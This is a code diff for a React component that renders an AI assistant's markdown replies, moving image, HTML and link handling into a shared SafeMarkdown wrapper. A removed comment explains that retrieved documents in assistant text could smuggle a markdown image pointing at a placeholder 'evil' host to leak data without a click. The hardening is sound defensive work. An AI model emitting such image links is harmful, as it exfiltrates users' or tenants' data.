@@ -3,15 +3,15 @@
 import React, { createContext, useContext, useMemo, useState } from "react";
 import Link from "next/link";
 import { useAuiState, type TextMessagePartProps, type ToolCallMessagePartProps } from "@assistant-ui/react";
-import ReactMarkdown, { type Components } from "react-markdown";
-import remarkGfm from "remark-gfm";
+import { type Components } from "react-markdown";
 import { ChevronRight, Wrench } from "lucide-react";
 import { cn } from "@/lib/cn";
 import { ICON_STROKE_WIDTH } from "@/lib/icons";
 import { Badge, type BadgeProps } from "@/components/ui/Badge";
 import { focusRing } from "@/components/ui/Button";
 import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/components/ui/Collapsible";
-import { CITATION_ATTR, citationSourcesForRun, remarkCitations, type CitationSource } from "./citations";
+import { SafeLink, SafeMarkdown } from "@/components/markdown/SafeMarkdown";
+import { CITATION_ATTR, citationSourcesForRun, type CitationSource } from "./citations";
 import { formatDuration, messageRunId, toolCallInfoKey, TOOL_STATUS_LABELS, type ToolCallInfo, type ToolCallStatus } from "./toolCalls";
 
 /**
@@ -127,22 +127,18 @@ export function MarkdownText({ text }: TextMessagePartProps) {
   const runId = messageRunId(messageId);
   const infos = useContext(ToolCallInfoContext);
   const sources = useMemo(() => (runId === null ? null : citationSourcesForRun(infos, runId)), [infos, runId]);
-  const remarkPlugins = useMemo(() => (sources ? [remarkGfm, remarkCitations(sources)] : [remarkGfm]), [sources]);
-  const components = useMemo<Components>(
-    () => ({
-      // Never an <img>: assistant text can carry tenant content (retrieved documents), and an image
-      // URL is fetched with no click (`![](https://evil/?leak=…)` would exfiltrate). Alt text only.
-      img: ({ alt }) => (alt ? <span data-testid="markdown-image-alt" className="text-muted-foreground">[image: {alt}]</span> : null),
-      ...(sources
+  // Images (alt text only), raw HTML and URL rules come from SafeMarkdown; only citations add an `a`.
+  const components = useMemo<Omit<Components, "img"> | undefined>(
+    () =>
+      sources
         ? {
-            a: ({ node: _node, children, href, ...props }) => {
+            a: ({ node: _node, children, href, title, ...props }) => {
               const n = (props as Record<string, unknown>)[CITATION_ATTR];
               if (typeof n === "string" && href) return <CitationLink n={n} href={href} source={sources.get(Number(n))} />;
-              return <a href={href} {...props}>{children}</a>;
+              return <SafeLink href={href} title={title}>{children}</SafeLink>;
             },
           }
-        : {}),
-    }),
+        : undefined,
     [sources],
   );
   return (
@@ -158,9 +154,9 @@ export function MarkdownText({ text }: TextMessagePartProps) {
         "[&_table]:block [&_table]:max-w-full [&_table]:overflow-x-auto [&_td]:border [&_td]:border-border [&_td]:px-2 [&_th]:border [&_th]:border-border [&_th]:px-2",
       )}
     >
-      <ReactMarkdown remarkPlugins={remarkPlugins} components={components} skipHtml>
+      <SafeMarkdown citations={sources} components={components}>
         {text}
-      </ReactMarkdown>
+      </SafeMarkdown>
     </div>
   );
 }
